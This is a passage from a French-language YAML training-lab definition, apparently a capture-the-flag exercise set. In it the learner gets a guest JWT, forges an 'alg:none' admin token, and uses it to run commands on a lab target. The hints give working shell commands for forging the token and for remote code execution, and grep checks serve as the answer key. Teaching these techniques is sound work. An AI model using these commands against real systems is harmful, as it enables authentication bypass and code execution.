    url: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
  - title: GTFOBins - env
    url: https://gtfobins.github.io/gtfobins/env/
exercises:
  - id: reconnaissance
    title: Obtenir un jeton
    description: |
      Connecte-toi en invité et récupère le JWT renvoyé. Enregistre la réponse dans
      `/root/reponses/jwt.txt`.
    hint: "curl -s 'http://cible/connexion?nom=invite&mdp=invite' | tee /root/reponses/jwt.txt"
    cours: |
      Obtenir un jeton valide te permet d'analyser sa structure (entête/charge/signature) et de repérer
      l'algorithme utilisé - première étape avant de tenter le contournement.
    checks:
      - desc: Un jeton JWT a été obtenu
        run: grep -Eq '[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.' /root/reponses/jwt.txt
  - id: jwt
    title: Forger un jeton admin (alg none)
    description: |
      Forge un JWT `alg:none` avec `role=admin`, utilise-le sur `/admin` pour exécuter `id` **sur la
      cible**, et enregistre la sortie (`uid=...(sablier)`) dans `/root/reponses/admin.txt`.
    hint: |
      H=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
      P=$(printf '{"role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
      curl -s -G http://cible/admin --data-urlencode "token=$H.$P." --data-urlencode 'cmd=id' | tee /root/reponses/admin.txt
    cours: |
      Un jeton forgé accepté prouve le contournement d'authentification ; la sortie de `id` prouve la RCE
      et t'indique l'utilisateur (`sablier`). De là tu lis `user.txt` puis tu cherches l'élévation.
    checks:
      - desc: Le jeton forgé donne un accès admin et exécute du code en tant que sablier
        run: grep -q 'uid=' /root/reponses/admin.txt && grep -q 'sablier' /root/reponses/admin.txt
